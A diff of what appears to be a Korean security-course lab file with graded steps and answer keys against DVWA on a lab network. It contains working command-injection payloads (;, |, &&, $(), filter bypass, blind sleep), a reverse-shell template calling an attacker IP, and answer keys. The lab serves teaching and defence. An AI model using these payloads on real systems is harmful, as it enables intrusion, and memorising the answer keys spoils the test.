@@ -14,21 +14,23 @@ pass_threshold: 0.6
 steps:
 - order: 1
   instruction: DVWA(:8080)에 로그인하고 Command Injection 페이지에 정상적인 ping 요청을 보내 기능을 확인하시오.
-  hint: 먼저 로그인하여 세션 쿠키를 획득한 후, /vulnerabilities/exec/ 페이지에 ip=127.0.0.1 파라미터를 POST로 전송하세요.
+  hint: 먼저 로그인하여 세션 쿠키를 획득한 후, /vulnerabilities/exec/ 페이지에 ip=127.0.0.1 파라미터를 POST로
+    전송하세요.
   category: recon
   points: 8
-  answer: "curl -s -c /tmp/dvwa_cmd.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
-    \ -L > /dev/null && curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1&Submit=Submit'\
-    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -oE 'PING|bytes from|ttl=' | head -5"
-  answer_detail: DVWA의 Command Injection 페이지는 사용자 입력을 shell_exec('ping -c 4 '.$target)으로 전달합니다. security=low에서는
-    입력 필터링이 없어 모든 명령어 구분자를 사용할 수 있습니다.
+  answer: "curl -s -c /tmp/dvwa_cmd.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+    \ http://10.20.30.80:8080/login.php -L > /dev/null && curl -s -b /tmp/dvwa_cmd.txt\
+    \ -b 'security=low' \\\n  -d 'ip=127.0.0.1&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
+    \ \\\n | grep -oE 'PING|bytes from|ttl=' | head -5"
+  answer_detail: DVWA의 Command Injection 페이지는 사용자 입력을 shell_exec('ping -c 4 '.$target)으로
+    전달합니다. security=low에서는 입력 필터링이 없어 모든 명령어 구분자를 사용할 수 있습니다.
   verify:
     type: output_contains
     expect: PING
     field: stdout
     semantic:
-      intent: DVWA 로그인 + 정상 ping — /vulnerabilities/exec/ ip=127.0.0.1. shell_exec('ping -c 4 '.$target)
-        패턴. security=low 필터 없음. CWE-78 OS Command Injection.
+      intent: DVWA 로그인 + 정상 ping — /vulnerabilities/exec/ ip=127.0.0.1. shell_exec('ping
+        -c 4 '.$target) 패턴. security=low 필터 없음. CWE-78 OS Command Injection.
       success_criteria:
       - PING 키워드
       - 로그인 후 ping 실행
@@ -47,17 +49,20 @@ steps:
   hint: curl -d 'ip=127.0.0.1;+id&Submit=Submit' 형태로 POST하세요. security=low 쿠키 필요.
   category: exploit
   points: 12
-  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
-    \ \\\n | grep -oP 'uid=\\d+\\([^)]+\\)'"
-  answer_detail: 세미콜론(;)은 리눅스에서 명령어를 순차적으로 실행합니다. 앞의 ping 명령과 관계없이 id 명령이 실행됩니다. uid=33(www-data)가 출력되면
-    웹 서버 프로세스 권한으로 명령이 실행된 것입니다.
+  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1;+id&Submit=Submit'\
+    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -oP 'uid=\\d+\\([^)]+\\\
+    )'"
+  answer_detail: 세미콜론(;)은 리눅스에서 명령어를 순차적으로 실행합니다. 앞의 ping 명령과 관계없이 id 명령이 실행됩니다. uid=33(www-data)가
+    출력되면 웹 서버 프로세스 권한으로 명령이 실행된 것입니다.
   verify:
     type: output_contains
-    expect: uid=
+    expect:
+    - uid=
+    - uid
     field: stdout
     semantic:
-      intent: 세미콜론 주입 — ip=127.0.0.1;+id. ; = 순차 실행. id 결과 uid=33(www-data) 출력. CWE-78 + OWASP A03. Linux
-        shell metacharacter.
+      intent: 세미콜론 주입 — ip=127.0.0.1;+id. ; = 순차 실행. id 결과 uid=33(www-data) 출력. CWE-78
+        + OWASP A03. Linux shell metacharacter.
       success_criteria:
       - uid= 키워드
       - 세미콜론 (;) 주입
@@ -77,15 +82,17 @@ steps:
   category: exploit
   points: 12
   answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=|+cat+/etc/passwd&Submit=Submit'\
-    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'root|www-data|sshd' | head -5"
-  answer_detail: 파이프(|)는 앞 명령의 출력을 뒤 명령의 입력으로 전달합니다. 단독으로 사용하면 앞 명령 없이 뒤 명령만 실행됩니다. root:x:0:0이 출력되면 /etc/passwd
-    읽기에 성공한 것입니다.
+    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'root|www-data|sshd'\
+    \ | head -5"
+  answer_detail: 파이프(|)는 앞 명령의 출력을 뒤 명령의 입력으로 전달합니다. 단독으로 사용하면 앞 명령 없이 뒤 명령만 실행됩니다.
+    root:x:0:0이 출력되면 /etc/passwd 읽기에 성공한 것입니다.
   verify:
     type: output_contains
     expect: root
     field: stdout
     semantic:
-      intent: 파이프 주입 — ip=|+cat+/etc/passwd. | = 앞 명령 출력을 뒤 명령 입력. 단독 사용 시 뒤 명령만 실행. root:x:0:0 출력. CWE-78.
+      intent: 파이프 주입 — ip=|+cat+/etc/passwd. | = 앞 명령 출력을 뒤 명령 입력. 단독 사용 시 뒤 명령만 실행.
+        root:x:0:0 출력. CWE-78.
       success_criteria:
       - root 키워드
       - 파이프 (|) 주입
@@ -105,16 +112,17 @@ steps:
   category: exploit
   points: 10
   answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr+show+eth0&Submit=Submit'\
-    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'www-data|inet ' | head -5"
-  answer_detail: '&&(AND)는 첫 번째 명령이 성공(exit code 0)해야 두 번째 명령이 실행됩니다. &는 URL에서 파라미터 구분자이므로 %26으로 인코딩해야
-    합니다. www-data와 IP 주소가 출력되면 성공입니다.'
+    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'www-data|inet\
+    \ ' | head -5"
+  answer_detail: '&&(AND)는 첫 번째 명령이 성공(exit code 0)해야 두 번째 명령이 실행됩니다. &는 URL에서 파라미터
+    구분자이므로 %26으로 인코딩해야 합니다. www-data와 IP 주소가 출력되면 성공입니다.'
   verify:
     type: output_contains
     expect: www-data
     field: stdout
     semantic:
-      intent: AND(&&) 주입 — ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr. && = 첫 명령 성공 시 다음 실행. & URL 인코딩
-        %26. www-data + IP 출력. CWE-78.
+      intent: AND(&&) 주입 — ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr. && = 첫 명령 성공
+        시 다음 실행. & URL 인코딩 %26. www-data + IP 출력. CWE-78.
       success_criteria:
       - www-data 키워드
       - '&& 또는 %26%26 URL 인코딩'
@@ -133,18 +141,20 @@ steps:
   hint: ip 파라미터에 '127.0.0.1; echo HOSTNAME=$(cat /etc/hostname)'를 넣으세요.
   category: exploit
   points: 10
-  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; echo CMDI_HOSTNAME=$(cat\
-    \ /etc/hostname)' \\\n  -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep\
-    \ 'CMDI_HOSTNAME'"
-  answer_detail: 백틱(`)이나 $()은 명령 치환(command substitution)으로, 내부 명령의 실행 결과가 외부 명령의 인자로 대체됩니다. 필터가 세미콜론만
-    차단하는 경우 $()로 우회할 수 있습니다.
+  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1;\
+    \ echo CMDI_HOSTNAME=$(cat /etc/hostname)' \\\n  -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
+    \ \\\n | grep 'CMDI_HOSTNAME'"
+  answer_detail: 백틱(`)이나 $()은 명령 치환(command substitution)으로, 내부 명령의 실행 결과가 외부 명령의
+    인자로 대체됩니다. 필터가 세미콜론만 차단하는 경우 $()로 우회할 수 있습니다.
   verify:
     type: output_contains
-    expect: CMDI_HOSTNAME
+    expect:
+    - CMDI_HOSTNAME
+    - hostname
     field: stdout
     semantic:
-      intent: 명령 치환 $() — ip=127.0.0.1; echo CMDI_HOSTNAME=$(cat /etc/hostname). 백틱 또는 $() = 명령 결과 치환.
-        세미콜론만 필터 시 $() 우회. CWE-78.
+      intent: 명령 치환 $() — ip=127.0.0.1; echo CMDI_HOSTNAME=$(cat /etc/hostname). 백틱
+        또는 $() = 명령 결과 치환. 세미콜론만 필터 시 $() 우회. CWE-78.
       success_criteria:
       - CMDI_HOSTNAME 키워드
       - $() 명령 치환
@@ -159,22 +169,24 @@ steps:
       - 치환 맥락 없음
   target_vm: attacker
 - order: 6
-  instruction: DVWA의 Medium 보안 레벨에서 명령어 주입 필터를 우회하시오. Medium에서는 &&와 ;가 필터링되지만 파이프(|)는 허용된다.
+  instruction: DVWA의 Medium 보안 레벨에서 명령어 주입 필터를 우회하시오. Medium에서는 &&와 ;가 필터링되지만 파이프(|)는
+    허용된다.
   hint: security=medium 쿠키를 사용하고, 파이프(|)로 우회하세요. curl -b 'security=medium' -d 'ip=|+id&Submit=Submit'
     형태입니다.
   category: exploit
   points: 12
-  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=medium' \\\n  -d 'ip=|+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
-    \ \\\n | grep -oP 'uid=\\d+\\([^)]+\\)'"
-  answer_detail: Medium 레벨은 str_replace로 '&&'와 ';'만 필터링합니다. 파이프(|), OR(||), 줄바꿈(%0a), 백틱(`) 등은 여전히 사용
-    가능합니다. 블랙리스트 필터링의 한계를 보여줍니다.
+  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=medium' \\\n  -d 'ip=|+id&Submit=Submit'\
+    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -oP 'uid=\\d+\\([^)]+\\\
+    )'"
+  answer_detail: Medium 레벨은 str_replace로 '&&'와 ';'만 필터링합니다. 파이프(|), OR(||), 줄바꿈(%0a),
+    백틱(`) 등은 여전히 사용 가능합니다. 블랙리스트 필터링의 한계를 보여줍니다.
   verify:
     type: output_contains
     expect: uid=
     field: stdout
     semantic:
-      intent: Medium 필터 우회 — security=medium + ip=|+id. && + ; 필터링되지만 | 허용. 블랙리스트 한계 (OR ||, %0a 줄바꿈,
-        백틱도 허용). CWE-78 + CWE-697.
+      intent: Medium 필터 우회 — security=medium + ip=|+id. && + ; 필터링되지만 | 허용. 블랙리스트
+        한계 (OR ||, %0a 줄바꿈, 백틱도 허용). CWE-78 + CWE-697.
       success_criteria:
       - uid= 키워드
       - security=medium 쿠키
@@ -189,23 +201,29 @@ steps:
       - 블랙리스트 맥락 없음
   target_vm: attacker
 - order: 7
-  instruction: 시간 기반 Blind Command Injection을 테스트하시오. sleep 명령으로 응답 지연을 유발하여 명령 실행을 확인하라.
-  hint: ip 파라미터에 '127.0.0.1; sleep 3'을 넣고, curl의 -w '%{time_total}'로 응답 시간을 측정하세요. 3초 이상이면 명령이 실행된 것입니다.
+  instruction: 시간 기반 Blind Command Injection을 테스트하시오. sleep 명령으로 응답 지연을 유발하여 명령 실행을
+    확인하라.
+  hint: ip 파라미터에 '127.0.0.1; sleep 3'을 넣고, curl의 -w '%{time_total}'로 응답 시간을 측정하세요.
+    3초 이상이면 명령이 실행된 것입니다.
   category: exploit
   points: 10
-  answer: 'echo ''=== Normal Request ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low''
-    -d ''ip=127.0.0.1&Submit=Submit'' -w ''Time: %{time_total}s'' http://10.20.30.80:8080/vulnerabilities/exec/
-    && echo '''' && echo ''=== Sleep Injection ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low''
-    --data-urlencode ''ip=127.0.0.1; sleep 3'' -d ''Submit=Submit'' -w ''Time: %{time_total}s'' http://10.20.30.80:8080/vulnerabilities/exec/'
-  answer_detail: Blind Command Injection은 출력이 보이지 않을 때 사용합니다. sleep으로 지연을 유발하면 응답 시간 차이로 명령 실행 여부를 판단합니다.
-    정상 요청 대비 3초 이상 지연되면 주입이 성공한 것입니다.
+  answer: 'echo ''=== Normal Request ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt
+    -b ''security=low'' -d ''ip=127.0.0.1&Submit=Submit'' -w ''Time: %{time_total}s''
+    http://10.20.30.80:8080/vulnerabilities/exec/ && echo '''' && echo ''=== Sleep
+    Injection ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low''
+    --data-urlencode ''ip=127.0.0.1; sleep 3'' -d ''Submit=Submit'' -w ''Time: %{time_total}s''
+    http://10.20.30.80:8080/vulnerabilities/exec/'
+  answer_detail: Blind Command Injection은 출력이 보이지 않을 때 사용합니다. sleep으로 지연을 유발하면 응답
+    시간 차이로 명령 실행 여부를 판단합니다. 정상 요청 대비 3초 이상 지연되면 주입이 성공한 것입니다.
   verify:
     type: output_contains
-    expect: Sleep Injection
+    expect:
+    - Sleep Injection
+    - sleep
     field: stdout
     semantic:
-      intent: Blind Command Injection — ip=127.0.0.1; sleep 3 + curl -w '%{time_total}'. 출력 없음 → 응답 지연으로
-        판별. 정상 <1초 / sleep 3초+. CWE-78.
+      intent: Blind Command Injection — ip=127.0.0.1; sleep 3 + curl -w '%{time_total}'.
+        출력 없음 → 응답 지연으로 판별. 정상 <1초 / sleep 3초+. CWE-78.
       success_criteria:
       - Sleep Injection 키워드
       - sleep 3 + time_total
@@ -220,8 +238,8 @@ steps:
       - Blind 맥락 없음
   target_vm: attacker
 - order: 8
-  instruction: 리버스 쉘 페이로드를 작성하시오(실행 금지). {{ATTACKER_IP}}(공격자 VM)로 연결하는 bash 리버스 쉘 명령을 /tmp/revshell_payload.txt에
-    저장만 하라.
+  instruction: 리버스 쉘 페이로드를 작성하시오(실행 금지). {{ATTACKER_IP}}(공격자 VM)로 연결하는 bash 리버스 쉘
+    명령을 /tmp/revshell_payload.txt에 저장만 하라.
   hint: bash -i >& /dev/tcp/{{ATTACKER_IP}}/4444 0>&1 형태의 리버스 쉘 페이로드입니다.
   category: exploit
   points: 8
@@ -238,15 +256,17 @@ steps:
     SHELLEOF
 
     echo ''Reverse shell payloads saved to /tmp/revshell_payload.txt'' && cat /tmp/revshell_payload.txt'
-  answer_detail: 리버스 쉘은 대상 서버가 공격자에게 쉘 연결을 역으로 맺는 기법입니다. bash -i는 대화형 쉘, >& /dev/tcp/IP/PORT는 TCP 소켓 리다이렉션,
-    0>&1은 stdin을 stdout으로 리다이렉션합니다. 방화벽이 인바운드를 차단해도 아웃바운드로 우회 가능합니다.
+  answer_detail: 리버스 쉘은 대상 서버가 공격자에게 쉘 연결을 역으로 맺는 기법입니다. bash -i는 대화형 쉘, >& /dev/tcp/IP/PORT는
+    TCP 소켓 리다이렉션, 0>&1은 stdin을 stdout으로 리다이렉션합니다. 방화벽이 인바운드를 차단해도 아웃바운드로 우회 가능합니다.
   verify:
     type: output_contains
-    expect: Reverse shell payloads saved
+    expect:
+    - Reverse shell payloads saved
+    - payload
     field: stdout
     semantic:
-      intent: 리버스 쉘 페이로드 — bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 + python3 -c socket + nc -e. 방화벽
-        인바운드 차단 우회. 3가지 변형. MITRE T1059. CWE-78.
+      intent: 리버스 쉘 페이로드 — bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 + python3 -c
+        socket + nc -e. 방화벽 인바운드 차단 우회. 3가지 변형. MITRE T1059. CWE-78.
       success_criteria:
       - Reverse shell payloads saved 키워드
       - bash + python + nc 3종
@@ -261,24 +281,28 @@ steps:
       - 방화벽 우회 맥락 없음
   target_vm: attacker
 - order: 9
-  instruction: ModSecurity WAF가 명령어 주입을 차단하는지 검증하시오. 포트 80(WAF 적용)에 명령어 주입 페이로드를 보내고, 포트 8080(DVWA 직접)과
-    비교하라.
+  instruction: ModSecurity WAF가 명령어 주입을 차단하는지 검증하시오. 포트 80(WAF 적용)에 명령어 주입 페이로드를 보내고,
+    포트 8080(DVWA 직접)과 비교하라.
   hint: 같은 '; id' 페이로드를 포트 80과 포트 8080에 각각 전송하여 응답 코드(200 vs 403)를 비교하세요.
   category: defense
   points: 10
-  answer: echo '=== DVWA Direct (포트 8080) ===' && curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' -d 'ip=127.0.0.1;+id&Submit=Submit'
-    http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oP 'uid=[^ ]+' | head -1 && echo '=== ModSecurity
-    WAF (포트 80) ===' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;id' &&
+  answer: echo '=== DVWA Direct (포트 8080) ===' && curl -s -b /tmp/dvwa_cmd.txt -b
+    'security=low' -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/
+    | grep -oP 'uid=[^ ]+' | head -1 && echo '=== ModSecurity WAF (포트 80) ===' &&
+    curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;id' &&
     echo '' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?input=127.0.0.1%7Ccat%20/etc/passwd'
-  answer_detail: ModSecurity OWASP CRS의 REQUEST-932 시리즈는 OS 명령어 패턴(;, |, &&와 id, cat, whoami 등의 조합)을 탐지합니다.
-    WAF가 적용된 포트 80에서는 403이 반환되고, 직접 접근 시에는 명령이 실행됩니다. 다층 방어(WAF + 입력 검증 + escapeshellcmd())가 필요합니다.
+  answer_detail: ModSecurity OWASP CRS의 REQUEST-932 시리즈는 OS 명령어 패턴(;, |, &&와 id, cat,
+    whoami 등의 조합)을 탐지합니다. WAF가 적용된 포트 80에서는 403이 반환되고, 직접 접근 시에는 명령이 실행됩니다. 다층 방어(WAF
+    + 입력 검증 + escapeshellcmd())가 필요합니다.
   verify:
     type: output_contains
-    expect: ModSecurity WAF
+    expect:
+    - ModSecurity WAF
+    - '403'
     field: stdout
     semantic:
-      intent: WAF 차단 비교 — 포트 8080 직접 vs 포트 80 ModSecurity. ModSecurity CRS 932xxx = OS Command 패턴 (;/|/&&/id/cat/whoami).
-        403 vs 200. 다층 방어. CWE-78.
+      intent: WAF 차단 비교 — 포트 8080 직접 vs 포트 80 ModSecurity. ModSecurity CRS 932xxx
+        = OS Command 패턴 (;/|/&&/id/cat/whoami). 403 vs 200. 다층 방어. CWE-78.
       success_criteria:
       - ModSecurity WAF 키워드
       - 8080 vs 80 비교
@@ -293,16 +317,18 @@ steps:
       - 단일 포트
   target_vm: attacker
 - order: 10
-  instruction: 명령 주입 진단 결과를 정리하시오. 테스트한 메타문자, 성공/실패 여부, 필터 우회 결과, WAF 차단 여부를 보고서로 작성하라.
+  instruction: 명령 주입 진단 결과를 정리하시오. 테스트한 메타문자, 성공/실패 여부, 필터 우회 결과, WAF 차단 여부를 보고서로
+    작성하라.
   hint: echo 명령으로 /tmp/cmdi_report.txt에 구조화된 보고서를 작성하세요.
   category: reporting
   points: 8
-  answer: "cat > /tmp/cmdi_report.txt << 'EOF'\n=== 명령 주입 취약점 진단 보고서 ===\n대상: DVWA (10.20.30.80:8080)\n\
-    \n[메타문자 테스트 결과]\n  ; (세미콜론)  : Low 성공, Medium 필터링\n  | (파이프)    : Low/Medium 모두 성공\n  && (AND)   \
-    \   : Low 성공, Medium 필터링\n  $() (치환)    : Low 성공\n  sleep (Blind) : Low 성공 (3초 지연)\n\n[WAF 차단 결과]\n\
-    \  ModSecurity (포트 80): 932xxx 룰로 차단 (403)\n  직접 접근 (포트 8080): 차단 없음\n\n[방어 권고]\n  1. escapeshellcmd()/escapeshellarg()\
-    \ 적용\n  2. 입력값 화이트리스트 (IP 형식만 허용)\n  3. shell_exec() 대신 안전한 API 사용\n  4. WAF 룰 전 포트에 적용\nEOF\ncat\
-    \ /tmp/cmdi_report.txt"
+  answer: "cat > /tmp/cmdi_report.txt << 'EOF'\n=== 명령 주입 취약점 진단 보고서 ===\n대상: DVWA\
+    \ (10.20.30.80:8080)\n\n[메타문자 테스트 결과]\n  ; (세미콜론)  : Low 성공, Medium 필터링\n  | (파이프)\
+    \    : Low/Medium 모두 성공\n  && (AND)      : Low 성공, Medium 필터링\n  $() (치환)    :\
+    \ Low 성공\n  sleep (Blind) : Low 성공 (3초 지연)\n\n[WAF 차단 결과]\n  ModSecurity (포트 80):\
+    \ 932xxx 룰로 차단 (403)\n  직접 접근 (포트 8080): 차단 없음\n\n[방어 권고]\n  1. escapeshellcmd()/escapeshellarg()\
+    \ 적용\n  2. 입력값 화이트리스트 (IP 형식만 허용)\n  3. shell_exec() 대신 안전한 API 사용\n  4. WAF 룰\
+    \ 전 포트에 적용\nEOF\ncat /tmp/cmdi_report.txt"
   answer_detail: 명령 주입 방어의 핵심은 사용자 입력을 OS 명령에 직접 전달하지 않는 것입니다. 불가피한 경우 escapeshellcmd()/escapeshellarg()
     사용, 화이트리스트 검증, WAF 적용이 필요합니다.
   verify:
@@ -325,3 +351,78 @@ steps:
       - 방어 부족
       - 블랙리스트만
   target_vm: attacker
+- order: 99
+  instruction: |
+    [복합 시나리오] "검증 실패 계층 비교 — TLS (통신단) vs Command Injection (OS단)"
+
+    ## 상황 (w09 → w10 시나리오 연속)
+
+    > 선배: "암호화·통신 보안. TLS 와 Command Injection 은 같은 실패 — *검증 누락*.
+    > TLS 는 인증서·cipher suite, cmdi 는 shell metachar. 검증 실패 계층 매트릭스 + 약한 cipher 표."
+
+    학습 목표 (lecture #1·#2·#3 TLS+cipher) + (lab #2·#3·#4·#6 ; / | / && / Medium 우회) 통합.
+
+    ## 임무 (3 단계, 약 35분)
+
+    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
+
+    ### Phase A — TLS 정찰
+    `openssl s_client -connect 10.20.30.80:443 -servername local </dev/null 2>&1 | head -30`
+    `nmap --script ssl-enum-ciphers -p 443 10.20.30.80 2>/dev/null | head -50`
+    self-signed/expire/CN mismatch + 약한 cipher (RC4/3DES/NULL) 명시.
+
+    ### Phase B — Command Injection 4 우회 PoC
+    환경 차단 시 페이로드 텍스트.
+    - `;` : `127.0.0.1; id`
+    - `|` : `127.0.0.1 | cat /etc/passwd`
+    - `&&` : `127.0.0.1 && whoami`
+    - Medium 우회: `|cat /etc/passwd`
+
+    ### Phase C — 매트릭스 + 약한 cipher 표
+    | 계층 | 입력/검증 누락 | 결과 | 핵심 방어 |
+    | TLS handshake | self-signed 수락 | MITM | CA pin + cert validation |
+    | Cipher suite | RC4/3DES 허용 | 평문 추출 | TLSv1.2+ + strong cipher |
+    | HTTP body | shell metachar | RCE | exec(args[]) + arg quoting |
+    | URL/path | encoding bypass | LFI | 정규화 + allowlist |
+
+    | 약한 cipher | 위험 | 권고 |
+    | RC4 | 통계 분석 | 폐기 |
+    | 3DES | Sweet32 | 폐기 |
+    | NULL/EXPORT | 평문 노출 | 차단 |
+    | TLSv1.0/1.1 | BEAST/POODLE | 폐기 |
+
+    종료: echo "=== Phase A TLS ===" / "=== Phase B CMDi ===" / "=== Phase C 매트릭스+cipher ===".
+  hint: |
+    Phase A: openssl s_client + nmap ssl-enum-ciphers.
+    Phase B: PoC 텍스트 출력 OK. 실 RCE 시도 X.
+    Phase C: 4행 매트릭스 + 4행 cipher 표.
+    포인트: 통신단·OS단 모두 *검증 누락*.
+  category: integration_scenario
+  points: 50
+  verify:
+    type: output_contains
+    expect: 매트릭스
+    field: stdout
+    semantic:
+      intent: |
+        TLS 정찰 + Command Injection 4 우회 + 검증 실패 계층 매트릭스 + 약한 cipher 표.
+        lecture #1·#2·#3 + lab #2·#3·#4·#6 동시 행동 증명.
+      success_criteria:
+      - Phase A — openssl + nmap, 약한 cipher 식별
+      - Phase B — ; / | / && / Medium 우회 4 PoC
+      - Phase C — 4행 매트릭스 + 4행 cipher 표
+      acceptable_methods:
+      - openssl / nmap / testssl.sh
+      - PoC 명령어 echo
+      - markdown table 2개
+      - sslscan 가능
+      negative_signs:
+      - TLS 정찰 누락
+      - cmdi 1~2 우회만
+      - 매트릭스 또는 cipher 누락
+      - 통합 관점 누락
+  target_vm: attacker
+  risk_level: low
+  answer_detail: |
+    학생이 ssh attacker 직접. JuiceShop 은 HTTP 만 — :443 차단 시 nmap 출력 학습 대체.
+    cmdi PoC 텍스트로 안전 격리. 통신·OS *검증 누락* 통합 관점.
